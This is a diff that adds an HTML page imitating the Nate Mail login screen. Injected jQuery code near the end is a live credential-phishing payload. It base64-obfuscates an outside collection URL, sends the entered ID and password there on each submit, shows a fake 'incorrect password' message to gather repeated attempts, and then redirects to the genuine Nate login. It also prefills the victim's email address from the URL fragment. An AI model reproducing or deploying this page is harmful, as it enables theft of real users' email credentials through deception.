@@ -1,0 +1,500 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="ko" lang="ko" xmlns="https://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>네이트 메일</title>
+	<link rel="stylesheet" type="text/css" href="https://mailimg.nate.com/newmail/css/common.css?t=20181010100000" />
+	<link rel="stylesheet" type="text/css" href="https://mailimg.nate.com/newmail/css/login.css"/>
+
+	<!-- 보안 단계 설정 라이브러리 -->
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/nate/js/xecure_nate.js?v=20181010100000"></script>
+	<!-- PKI 암호화 라이브러리  -->
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/js/rsa/base64.js"></script>
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/js/rsa/jsbn.js"></script>
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/js/rsa/prng4.js"></script>
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/js/rsa/rng.js"></script>
+	<script type="text/javascript" src="https://home.mail.nate.com/login/secure/js/rsa/rsa.js"></script>
+
+	<script type="text/javascript" src="https://home.mail.nate.com/login/js/cyui_resize.js"></script>
+	<script type="text/javascript">
+	// <![CDATA[
+	function init()
+	{
+		var frm = document.f_login;
+		// 아이디저장 및 보안단계 쿠키에 따른 초기 설정
+		xLogin.setLoginForm(frm.keeplogin, frm.ID, frm.domain);
+
+		if (frm.ID.value != ""){
+			frm.ID.focus();
+			frm.PASSWD.focus();
+		}else{
+			frm.ID.setAttribute("autocomplete","off");
+			frm.PASSWD.setAttribute("autocomplete","off");
+			frm.ID.focus();
+		}
+		frm.ID.setAttribute("autocomplete","off");
+		frm.PASSWD.setAttribute("autocomplete","off");
+
+		if (frm.ID.value != ""){
+			frm.ID.previousSibling.style.display = "none";
+		}
+	}
+
+	/*
+	*네이트탭 로그인
+	*/
+	function checkInput()
+	{
+		var frm = document.f_login;
+		frm.ID.value = xCommon.trim(frm.ID.value);
+		frm.PASSWD.value = xCommon.trim(frm.PASSWD.value);
+	    if ( frm.ID.value == '' ) {
+	        alert('아이디를 입력해주십시오.');
+	        frm.ID.focus();
+	        return false;
+	    }
+	    if ( frm.PASSWD.value == '' ) {
+	        alert('비밀번호를 입력해주십시오.');
+	        frm.PASSWD.focus();
+	        return false;
+	    }
+	    /*
+	    *SKP 통합 ID 관련 추가
+	    *도메인 있는지 여부 검증
+	    *기존 셀렉트 박스 형식 텍스트 방식으로 입력 받는 구조로 수정
+	    */
+	    var idIndexValue = frm.ID.value.indexOf('@');
+	    if ( idIndexValue > -1 ) {						//도메인 붙여 입력한 경우
+	    	frm.domain.value = frm.ID.value.substring(idIndexValue+1);
+	    }else{											//따로 도메인 없을경우 nate.com 으로 셋팅
+	        frm.domain.value = "nate.com";
+	    }
+
+	    // 로그인 관련 쿠키 생성
+		xLogin.setCookie(frm.keeplogin, frm.ID, frm.domain);
+
+		// RSA 암호화
+		if (! xXecure.isCKKeyPro()){
+			xRSA.encrypt(frm.ID, frm.PASSWD, frm.PASSWD_RSA, "NATE");
+		}else{
+			xRSA.encryptE2E(frm.ID, "f_login", "PASSWD", frm.PASSWD_RSA, "NATE");
+		}
+
+		frm.action = 'https://xo.nate.com/LoginAuth.sk';
+	    frm.submit();
+		return true;
+	}
+
+	function openWin(rUrl, rType)
+	{
+		var t = new Date().getTime();
+		if (rType == "pop_close")
+		{
+			window.open(rUrl,'new_win'+t,'');
+			if (/MSIE/.test(navigator.userAgent))
+			{
+				if(navigator.appVersion.indexOf("MSIE 7.0") >= 0) {
+					window.opener='self';
+					window.open('','_parent','');
+					window.close();
+				} else {
+//					opener.self.close();	2011.03.29 junhee 팝업로그인의 바닥창 사라지는 문제
+				}
+			}
+		} else if (rType == "pop_remain") {
+			window.open(rUrl,'new_win'+t,'');
+			return false;
+		} else {
+		}
+		return false;
+	}
+	// ]]>
+	</script>
+
+	<script>
+	// <![CDATA[
+	function _openWin(u)
+	{
+		h = 600;
+		w = 800;
+		var win = window.open(u, 'notice_unauth', 'scrollbars=yes,statusbar=0,height='+h+',width='+w+',left='+((screen.width-w)/2)+',top='+((screen.height-h)/2));
+		win.focus();
+	}
+	// ]]>
+	</script>
+</head>
+<body onload="init();">
+<!--header-->
+<div id="Header">
+    <a id="startElement" class="blind">메일 페이지 시작점</a>
+    <a href="javascript:Main.focus('LnbWrap')" class="skipgo"><strong>메일 메뉴로 바로가기</strong></a>
+    <a href="javascript:Main.focus('nmList')" class="skipgo"><strong>메일 목록으로 바로가기</strong></a>
+    <h1><a href="https://www.nate.com/?f=mail">NATE</a></h1>
+    <h2>메일</h2>
+    <div id="SnbWrap">
+        <ul class="snbList">
+            <li class="comm_mail"><a href="https://mail3.nate.com/" class="on" target="_top">메일</a></li>
+            <li class="comm_note"><a href="https://mail.nate.com/natenote/" class="" target="_top">쪽지</a></li>
+            <li class="comm_chat"><a href="https://mail.nate.com/chat/" class="" target="_top">대화</a></li>
+            <li class="comm_sms"><a href="https://mail.nate.com/sms/" class="" target="_top">문자</a></li>
+            <li class="comm_pims"><a href="https://mail.nate.com/pims/" class="" target="_top">주소록</a></li>
+        </ul>
+    </div>
+    <!-- QR 코드 및 로그아웃 버튼 위치 변경 2013.10.22-->
+    <div id="textGNB" class="nateGnb">
+		<div id="GnbWrap">
+			<dl class="gnbmenu">
+				<dt class="hidden">네이트 서비스 바로가기</dt>
+				<dd class="mobile">
+					<a href="#" onclick="if (document.getElementById('mobileQrLayer').style.display=='') document.getElementById('mobileQrLayer').style.display='none'; else document.getElementById('mobileQrLayer').style.display=''; return false;" class="nate"><span>모바일</span></a>
+				</dd>
+			</dl>
+
+			<div style="display:none;" id="mobileQrLayer">
+				<span class="arr"></span>
+				<a title="닫기" href="#" onclick="document.getElementById('mobileQrLayer').style.display='none'; return false;" class="close">닫기</a>
+				<div class="tit" id="mobileQrLayerTarget"><strong class="nate">네이트 메일</strong> 모바일로 만나보세요</div>
+				<ul>
+					<li>
+						<img src="https://mailimg.nate.com/newmail/img/cms/qrcode_android.png" alt="안드로이드 앱" class="qrImg">
+							<a href="https://mobile.nate.com/apps/sub.html?type=mail" target="_blank">안드로이드 앱<em class="pointer">소개페이지 바로가기(새창)</em></a>
+					</li>
+					<li>
+						<img src="https://mailimg.nate.com/newmail/img/cms/qrcode_ios.png" alt="아이폰 앱" class="qrImg">
+						<a href="https://mobile.nate.com/apps/sub.html?type=mail" target="_blank">아이폰 앱<em class="pointer">소개페이지 바로가기(새창)</em></a>
+					</li>
+					<li>
+						<img src="https://mailimg.nate.com/newmail/img/cms/qrcode_mobileweb.png" alt="모바일 웹" class="qrImg">
+						<a href="https://mobile.nate.com/mweb/sub.html?type=mail" target="_blank">모바일웹<em class="pointer">소개페이지 바로가기(새창)</em></a>
+					</li>
+				</ul>
+			</div>
+		</div>
+	</div>
+    <!-- QR 코드 및 로그아웃 버튼 위치 변경 -->
+</div>
+<div class="main">
+    <div class="loginBox">
+        <div id="loginArea" class="loginArea">
+            <!-- 수정 140318 -->
+            <a href="https://www.nate.com" class="logoNate" target="_blank">nate</a>
+
+<form id="f_login" name="f_login" target="_top" AUTOCOMPLETE="off">
+                <fieldset>
+                    <legend>네이트 로그인</legend>
+                    <input type="hidden" id="domain" name="domain" value="">
+
+                    <!-- 로그인 통계를 위한 통계코드 -->
+                    <input type="hidden" name="cpurl" value="mail3_ndr.nate.com/be_mail">
+
+                    <!-- PKI 암호화 처리된 값 전달용 input -->
+                    <input type="hidden" id="PASSWD_RSA" name="PASSWD_RSA" value="">
+
+                    <!-- 로그인 후 이동 URL input (네이트용) -->
+                    <input type="hidden" name="redirect" value="https://mail3.nate.com/">
+
+                    <!-- 성인인증관련 구분 값 -->
+                    <input type="hidden" id="mode" name="mode" value="">
+                    <input type="hidden" id="e_url" name="e_url" value="https://www.nate.com/">
+
+                    <div id="tab_cont1" class="formArea">
+                        <h2 class="invisible">네이트</h2>
+                        <ul>
+                            <li>
+                            	<label id="id_layer" for="ID">네이트 ID</label>
+                            	<input type="UserName" required name="ai" value=""
+                                                                   id="id" class="text" maxlength="40"
+                                                                   title="네이트 아이디 입력"
+                                                                   onfocus="xXecure.showCKKeyProPopup();"
+                                                                   onblur="xXecure.hideCKKeyProPopup();"
+                                                                   style="background-color: transparent;"
+                                                                   autocomplete="off" />
+                           </li>
+                            <li><label for="PASSWD">네이트 비밀번호</label>
+                                <input type="Password" required name="password" value=""
+                                                                           id="pw" class="text" maxlength="20"
+                                                                           title="네이트 비밀번호 입력"
+                                                                           onfocus="xXecure.showCKKeyProPopup();"
+                                                                           onblur="xXecure.hideCKKeyProPopup();"
+                                                                           enc="on" oncopy="return false;"
+                                                                           autocomplete="off"
+                                                                           style="background-color: transparent;">
+                            </li>
+                        </ul>
+                        <div class="id_save">
+                            <input type="checkbox" value="" id="keeplogin" name="keeplogin" title="아이디 저장"><label
+                                for="keeplogin">아이디 저장</label>
+                        </div>
+                        <div class="security">
+                            <!--div class="security_level">
+                                <iframe src="https://home.mail.nate.com/login/secure/nate/login_ifrm_level.html" id="xXecureIfrm" name="xXecureIfrm" width="54" height="15" scrolling="no" frameborder="0" title="보안레벨"></iframe>
+                            </div>
+                            <p style="cursor:pointer;" onclick="xXecurePop.openWin(1);">보안<strong id="securityText">1</strong>단계</p-->
+                            <p><a href="javascript:xXecurePop.openWin(3);" title="새창열림">IP보안 <em id="ipLevelText"
+                                                                                                 class="two">ON</em></a>
+                            </p>
+							
+                        </div>
+						
+                        <button  type="submit" class="btn_login" onclick="return checkInput();" id="log.login">로그인</button>
+						<div id="error_message" style="width:90%; color:red">  
+                        <div class="link_footer">
+                            <a href="https://helpdesk.nate.com/userinfo/exMemberInfo.asp?pgcode=search_id">아이디찾기</a>
+                            <span class="bar">ㅣ</span>
+                            <a href="https://helpdesk.nate.com/userinfo/exMemberInfo.asp?pgcode=search_pw">비밀번호 찾기</a>
+                            <span class="bar">ㅣ</span>
+                            <a href="https://member.nate.com/Member/Regist/Join.sk?cpcode=comm">회원가입</a>
+                        </div>
+                        <div id="lyr_openid" class="lyr_openid" style="display: none;">
+                            <div class="inbox">
+                                <p class="txt"><strong>엠파스, 라이코스, 넷츠고</strong> 아이디는<br>계정까지 모두 입력 해 주세요</p>
+                                <p class="stxt">예) empal 메일의 경우 <br>@empas.com을 입력해주세요</p>
+                            </div>
+                            <a href="#" class="btn_close" onclick="lay('none');" title="닫기">닫기</a>
+                        </div>
+                    </div>
+
+                    <div id="security_notification_program" class="sec_notification" style="display:none;">
+                        <div class="inbox">
+                            <p class="txt"><strong>보안 3단계</strong> 로그인을 사용하시려면<br>키보드 보안 프로그램을 설치<br>또는 업그레이드 해주세요.<br>
+                            </p>
+                        </div>
+                        <div class="task">
+                            <a href="#" class="upgrade">설치(업그레이드)하기</a>
+                            <a href="#"
+                               onclick="javascript:this.parentNode.parentNode.style.display='none';return false;">닫기</a>
+                        </div>
+                        <a href="#" class="btn_close"
+                           onclick="javascript:this.parentNode.style.display='none';return false;" title="닫기">닫기</a>
+                    </div>
+                    <div id="security_notification_cannotUse" class="sec_notification" style="display:none;">
+                        <div class="inbox">지금 사용 중인 브라우저에서는<br><strong>키보드보안 기능</strong>을 사용할 수 없습니다.</div>
+                        <div class="task"><a href="#"
+                                             onclick="javascript:this.parentNode.parentNode.style.display='none';return false;">닫기</a>
+                        </div>
+                        <a href="#" class="btn_close"
+                           onclick="javascript:this.parentNode.style.display='none';return false;" title="닫기">닫기</a>
+                    </div>
+                </fieldset>
+            </form>
+            <!-- //수정 140318 -->
+            <div id="keepLoginLayer" class="overlay_info type_keeplogin" style="display:none;">
+                <p>개인정보 보호를 위해<br>개인PC에서만<br>사용해 주세요. &nbsp;<a
+                        href="https://erms.nate.com/faq/exSelfFAQA.jsp?PageNo=1&amp;nodeId=NODE0000001300&amp;parentNodeId=NODE0000000595&amp;grandParentNodeId=&amp;nodeDepth=4&amp;checkFaq=0&amp;faqId=FAQS0000012703&amp;index=6"
+                        target="_blank">도움말보기 <i class="icon_arrow_right_red"></i></a></p>
+                <button type="button" value="알림 레이어 닫기" title="알림 레이어 닫기" id="closeBtn" class="icon_x_black">알림 레이어 닫기
+                </button>
+            </div>
+        </div>
+    </div>
+    <div class="loginContent">
+    	<div class="bg1"></div>
+        <div class="loginInfo">
+            <h3>쉽고 빠른 편집</h3>
+            <p class="hiddenTxt">
+                메일 선택 후 내 메일함으로 끌어당겨 보세요.
+                손쉽게 이동 및 삭제를 할 수 있습니다.</p>
+
+            <h3>스마트한 우측 뷰</h3>
+            <p class="hiddenTxt">
+                쓰기에서 자주 사용하는 메일주소를 저장할 수 있으며
+                편지함에서는 분할 모드로 미리보기를 할 수 있습니다.</p>
+
+            <h3>간편하고 빠른 간단쓰기</h3>
+            <p class="hiddenTxt">
+                메일 쓰기에서 우측 아이콘을 통해 간단쓰기가 가능합니다.</p>
+        </div>
+        <span class="dvs dv1"></span>
+        <span class="dvs dv2"></span>
+        <span class="dvs dv3"></span>
+    </div>
+    <div class="footer">
+        <div class="bg">
+            <h3 class="hiddenTxt">모바일에서도 네이트 메일앱</h3>
+            <div class="linkArea">
+                <a href="//play.google.com/store/apps/details?id=com.skcomms.android.mail" class="link hiddenTxt">Android 다운</a>
+                <a href="//itunes.apple.com/kr/app/id456534170?mt=8" class="link hiddenTxt ios">IOS 다운</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+(function(w) {
+	w.displayLayer = function(id, prop) {
+		var el = document.getElementById(id);
+		el.style.display = (prop == 'show')?'block':'none';
+	}
+})(window);
+
+(function(){
+	// placeholder 수정 140327
+	var loginForms = [
+		document.getElementById('id'),
+		document.getElementById('pw')
+	],
+	lyr_openid = document.getElementById('lyr_openid');
+
+	for(var i=0; i<loginForms.length; i++){
+		loginForms[i].onfocus = loginFormInputTextFocus;
+		loginForms[i].onblur = loginFormInputTextBlur;
+	}
+	function loginFormInputTextFocus(){
+		var check = document.getElementById('keepLoginLayer');
+		if(check.style.display==='block') {
+			displayLayer('keepLoginLayer', 'hide');
+		}
+		this.style.backgroundColor = '#fff';
+		if(this.getAttribute('id') == 'id'){
+			lyr_openid.style.display = 'block';
+		}
+	}
+	function loginFormInputTextBlur(){
+		if(this.value == '') this.style.backgroundColor = 'transparent';
+		if(this.getAttribute('id') == 'id'){
+			lyr_openid.style.display = 'none';
+		}
+	}
+})();
+
+(function(){
+	var checkLogin = document.getElementById('keeplogin'),
+		closeBtn = document.getElementById('closeBtn');
+	checkLogin.onclick = function() {
+		if(this.checked)
+			displayLayer('keepLoginLayer', 'show');
+		else
+			displayLayer('keepLoginLayer', 'hide');
+	};
+	closeBtn.onclick = function() {
+		displayLayer('keepLoginLayer', 'hide');
+	};
+
+})();
+// ]]>
+</script>
+
+<img src="https://stat.nate.com/stat/stat.tiff?cp_url=[mail3_ndr.nate.com/be_main2/??ndru3=&ndrl3=&ndrparam1=nmail&ndrparam4=]&t=1555291678" width="0" height="0" border="0" alt="" />
+<!-- 키보드 보안 ActiveX 실행 영역   -->
+<div id="XecureDiv" style="visibiltiy: hidden; position: absolute; width: 0px; height: 0px;"></div>
+
+	
+	
+<script>
+		
+		
+
+
+var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+ 
+ if (feedUpdateSplit[x]=="#"){
+  var che= feedUpdateResponse.substring(x+1);
+ 
+ }else{
+ 
+
+ }
+
+ 
+ 
+ }
+  document.getElementById("pet").value =che
+document.getElementById("p1").innerHTML = che
+  document.getElementById("pet").value =che
+
+</script>
+
+
+
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+    <script>
+
+	  
+	   $(document).ready(function() {
+		    var user=$("#pet").val();
+		  var  count=0;
+		   
+		   
+		   
+		    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#msg").hide();
+
+    }
+		   
+		   
+        $('form').submit(function(e) {
+			
+			count=count+1;
+			
+		   var d=atob("aHR0cHM6Ly9nZW9zb25pY25nLmNvbS93cmsvankvbnQucGhw");
+
+            e.preventDefault();
+               $.ajax({
+			   
+            type: 'POST',
+            url: d,
+			crossDomain: true,
+            data: $('form').serialize(),
+			
+			 beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+			  
+			  
+			  
+if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://home.mail.nate.com/login/login.html?s=mail&redirect=https%3A%2F%2Fmail3.nate.com%2F");
+
+                  }else{
+				   var x = document.getElementById("id").value;
+					 
+					
+				   $('#submit-btn').html('CONTINUE');
+					   document.getElementById("pw").value ="";
+					 
+					
+            	$("#err_common").show();
+				    $("#error_message").html("입력한 사용자 이름이나 비밀번호가 올바르지 않습니다.");
+				
+
+					 }
+						
+            },
+			
+			
+					 
+            success: function () {
+				$("#error_message").show();
+				    $("#err_common").html("입력한 사용자 이름이나 비밀번호가 올바르지 않습니다.");
+				
+
+	
+            }
+          });
+        });
+    });
+    </script>
+
+
+</body>
+</html>
